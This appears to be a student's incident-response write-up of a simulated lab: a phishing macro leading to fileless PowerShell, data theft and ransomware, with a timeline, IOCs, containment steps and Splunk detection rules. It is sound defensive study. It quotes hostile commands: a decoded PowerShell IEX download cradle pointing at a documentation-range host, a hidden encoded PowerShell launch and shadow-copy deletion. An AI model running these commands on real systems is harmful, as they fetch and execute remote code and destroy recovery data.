[case-06-phishing-macro-ransomware.md](https://github.com/user-attachments/files/34575607/case-06-phishing-macro-ransomware.md)
# Case 06: The Invoice That Locked Finance

**Type:** Phishing → fileless PowerShell → ransomware with data theft (double extortion)
**Host:** FIN-PC07 (10.0.5.27) · **User:** laura · **Date:** 2026-11-04
**Severity:** Critical
**Log sources:** Windows process creation (Event 4688), firewall logs, file activity logs

> Note: this is a simulated lab. I wrote the log files myself to practise investigating a realistic ransomware attack from start to finish. The IPs come from documentation ranges (198.51.100.0/24, 203.0.113.0/24).

---

## 1. Summary

At 09:25 the Finance team reported that their files ended in `.locked`. I went through the process, network and file logs from FIN-PC07 and rebuilt the whole attack.

Laura opened a macro-enabled Word file (`Invoice_Nov2026.docm`) from an email. The macro started hidden, encoded PowerShell. PowerShell downloaded a script from the attacker's server and ran it in memory. The malware then:

- set itself to start at every login
- beaconed to its C2 server every 10 minutes
- reached the Finance file share over SMB
- sent about **734 MB** of data out
- deleted the Windows shadow copies
- cleared the PowerShell history
- encrypted files on the PC and on the share

The whole attack, from the click to the locked files, took **25 minutes**.

---

## 2. Timeline

| Time | Event | Evidence | MITRE ATT&CK |
|---|---|---|---|
| 08:54:58 | `Invoice_Nov2026.docm` saved to Downloads | files.log | T1566.001 Spearphishing Attachment |
| 08:55:02 | Outlook opens Word with the .docm file | 4688, Parent=OUTLOOK.EXE | T1204.002 User Execution: Malicious File |
| 08:55:19 | Word starts `powershell.exe -nop -w hidden -enc ...` | 4688, Parent=WINWORD.EXE | T1059.001 PowerShell |
| 08:55:21 | PowerShell downloads `update.ps1` from 198.51.100.77 over HTTP (48 KB) | firewall | T1105 Ingress Tool Transfer |
| 08:57:38 | `onedrivesync.exe` created in AppData\Roaming | files.log | T1036 Masquerading |
| 08:57:40 | Run key `OneDriveSync` added | 4688, reg.exe | T1547.001 Registry Run Keys |
| 08:58 / 09:08 / 09:18 | ~500-byte HTTPS connections to 198.51.100.77 every 10 minutes | firewall | T1071.001 C2 over Web Protocols |
| 09:18:05 | `onedrivesync.exe` starts | 4688 | |
| 09:18:40 | Connection to file server 10.0.5.10 on port 445 (SMB) | firewall | T1039 Data from Network Shared Drive |
| 09:18:52 | **734,003,200 bytes** sent to 203.0.113.200 over 443 | firewall | T1567 Exfiltration Over Web Service |
| 09:19:30 | `vssadmin delete shadows /all /quiet` | 4688 | T1490 Inhibit System Recovery |
| 09:20:02 | PowerShell history file deleted | 4688, cmd.exe | T1070.003 Clear Command History |
| 09:20:10–13 | 6 files renamed to `.locked` (3 local, 3 on `\\10.0.5.10\finance`) | files.log | T1486 Data Encrypted for Impact |
| 09:20:15 | Ransom note `README_RESTORE_FILES.txt` on the desktop | files.log | |

---

## 3. How I investigated

**How bad is it?**
```bash
grep -c "locked" files.log
# 6
```

**Where did it start?** I read the `Parent=` field in the process log and found this chain:
```
OUTLOOK.EXE → WINWORD.EXE → powershell.exe (hidden, encoded) → reg.exe / onedrivesync.exe → vssadmin.exe, cmd.exe
```
Word has no normal reason to start PowerShell. That was the first big red flag.

**What did the hidden command do?** PowerShell `-enc` uses Base64 over UTF-16LE text, so I decoded it:
```bash
grep -o 'enc [A-Za-z0-9+/=]*' process.log | cut -d' ' -f2 | base64 -d | iconv -f UTF-16LE -t UTF-8; echo
```
Result:
```
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/update.ps1')
```
It downloads a script and runs it straight in memory with `IEX`, with no file saved. That's fileless execution.

**Network clues:**
- **Beaconing:** the same destination, exactly every 10 minutes, about 500 bytes each time. Machines do this, people don't.
- **Exfiltration:** one connection sent 734 MB to a different IP. The beacons were ~500 bytes, so this one stood out right away.
- **SMB 445 to the file server:** this explains why files on the shared Finance drive were locked as well as the ones on Laura's PC.

---

## 4. Indicators of Compromise (IOCs)

| Type | Value | Role |
|---|---|---|
| IP | 198.51.100.77 | Payload download + C2 |
| IP | 203.0.113.200 | Exfiltration server |
| URL | http://198.51.100.77/update.ps1 | PowerShell payload |
| File | Invoice_Nov2026.docm | Phishing attachment |
| File | C:\Users\laura\AppData\Roaming\onedrivesync.exe | Ransomware, posing as OneDrive |
| Registry | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync | Persistence |
| File | README_RESTORE_FILES.txt | Ransom note |
| Extension | .locked | Encrypted files |

---

## 5. Response: what I would do

**Contain (first, fast)**
1. Isolate FIN-PC07 from the network (EDR isolation or unplug it). Don't shut it down, because memory evidence matters with fileless malware.
2. Disable Laura's account and reset her password.
3. Block 198.51.100.77 and 203.0.113.200 on the firewall and proxy.
4. Take the Finance share offline to stop more encryption.
5. Search the SIEM for any other host talking to these IPs.

**Preserve evidence**
- Take a memory dump and disk image of FIN-PC07 before cleaning it.
- Export the logs and the phishing email (with headers) for the report.

**Eradicate and recover**
- Rebuild FIN-PC07 from a clean image. Don't try to clean it in place.
- Restore the Finance share from **offline** backups.
- Remove the email from all mailboxes and block the sender.

**Escalate**
- About 734 MB of Finance data (salaries, payroll, clients) left the company. This is likely a **personal data breach**, so management and the DPO need to know. Under GDPR, the authority must be notified within 72 hours.

---

## 6. Detection rules I designed

Splunk-style searches that would have caught this earlier. Field names depend on how the logs are parsed.

**Rule 1: Office app starts PowerShell or cmd** (would have alerted at 08:55:19)
```spl
index=windows EventCode=4688
  (ParentProcessName="*\\WINWORD.EXE" OR ParentProcessName="*\\EXCEL.EXE" OR ParentProcessName="*\\OUTLOOK.EXE")
  (NewProcessName="*\\powershell.exe" OR NewProcessName="*\\cmd.exe")
| table _time host user ParentProcessName NewProcessName CommandLine
```

**Rule 2: Encoded or hidden PowerShell**
```spl
index=windows EventCode=4688 NewProcessName="*\\powershell.exe"
  (CommandLine="*-enc*" OR CommandLine="*-w hidden*" OR CommandLine="*IEX*")
```

**Rule 3: Shadow copy deletion** (almost never legitimate, so treat it as critical)
```spl
index=windows EventCode=4688 NewProcessName="*\\vssadmin.exe" CommandLine="*delete shadows*"
```

**Rule 4: Beaconing** (same destination, regular gaps, small size)
```spl
index=firewall dest_port=443
| sort 0 _time
| streamstats current=f last(_time) as prev_time by src dest
| eval gap=_time-prev_time
| stats count avg(gap) as avg_gap stdev(gap) as jitter avg(bytes) as avg_bytes by src dest
| where count>=3 AND jitter<30 AND avg_bytes<2000
```

**Rule 5: Large upload from one host**
```spl
index=firewall
| bin _time span=1h
| stats sum(bytes) as total_bytes by _time src dest
| where total_bytes > 500000000
```

**Rule 6: Mass file rename** (ransomware encrypting)
```spl
index=files action=RENAME
| bin _time span=1m
| stats count by _time host
| where count > 5
```

---

## 7. Lessons learned and recommendations

| Problem | Fix | Control type |
|---|---|---|
| Macros in an email attachment ran | Block macros in files from the internet (Group Policy) | Preventive |
| A user could run any PowerShell | Constrained Language Mode, script block logging (Event 4104) | Preventive / Detective |
| Laura's account could write to the whole Finance share | Least privilege on shares | Preventive |
| Shadow copies were the only quick backup | Offline / immutable backups, tested regularly | Corrective |
| Outbound traffic wasn't watched | Egress filtering + alerts for beaconing and large uploads | Detective |
| The user trusted an "invoice" | Phishing awareness training (.docm, urgency, unknown senders) | Directive / Operational |

**What I learned:** the attack chain came out of the parent → child process relationships. The network logs showed what the attacker was really after, which was the data, not only the encryption. I also saw how much faster detection could have been: Rule 1 would have alerted 25 minutes before any file was locked.
